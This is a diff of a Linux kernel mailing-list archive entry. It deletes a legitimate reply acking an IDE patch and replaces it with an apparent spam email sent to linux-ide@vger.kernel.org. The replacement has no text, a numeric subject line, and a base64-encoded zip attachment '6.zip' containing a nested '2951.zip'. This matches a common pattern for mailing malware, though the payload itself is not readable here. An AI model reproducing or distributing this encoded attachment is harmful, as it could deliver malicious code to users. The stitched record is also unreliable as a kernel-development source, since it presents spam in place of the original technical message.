@@ -1,25 +1,67 @@
-From: David Miller <davem@davemloft.net>
-Subject: Re: [PATCH 3/3] ide-pm: always pass 0 error to ide_complete_rq in
- ide_do_devset
-Date: Wed, 26 Apr 2017 10:39:08 -0400 (EDT)
-Message-ID: <20170426.103908.1730143387784680812.davem@davemloft.net>
-References: <20170426073422.14511-1-hch@lst.de>
-        <20170426073422.14511-4-hch@lst.de>
+From: <obsexitos@gmail.com>
+Subject: 14306 linux-ide
+Date: Fri, 28 Apr 2017 06:17:35 -0000
+Message-ID: <149336025526.22262.14772418904813651332@bdnet.com.br>
 Mime-Version: 1.0
-Content-Type: Text/Plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Return-path: <linux-block-owner@vger.kernel.org>
-In-Reply-To: <20170426073422.14511-4-hch@lst.de>
-Sender: linux-block-owner@vger.kernel.org
-To: hch@lst.de
-Cc: axboe@kernel.dk, linux-ide@vger.kernel.org, linux-scsi@vger.kernel.org, linux-block@vger.kernel.org
+Content-Type: application/zip; name="6.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-ide-owner@vger.kernel.org>
+Received: from 93.56.184.177.bdnet.com.br ([177.184.56.93]:4613 "HELO
+        bdnet.com.br" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S935778AbdD1GRl (ORCPT
+        <rfc822;linux-ide@vger.kernel.org>); Fri, 28 Apr 2017 02:17:41 -0400
+Content-Disposition: attachment
+Sender: linux-ide-owner@vger.kernel.org
 List-Id: linux-ide@vger.kernel.org
+To: linux-ide@vger.kernel.org
 
-From: Christoph Hellwig <hch@lst.de>
-Date: Wed, 26 Apr 2017 09:34:22 +0200
-
-> The caller only looks at the scsi_request result field anyway.
-> 
-> Signed-off-by: Christoph Hellwig <hch@lst.de>
-
-Acked-by: David S. Miller <davem@davemloft.net>
+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
+AQBaAAAAhQoAAAAA
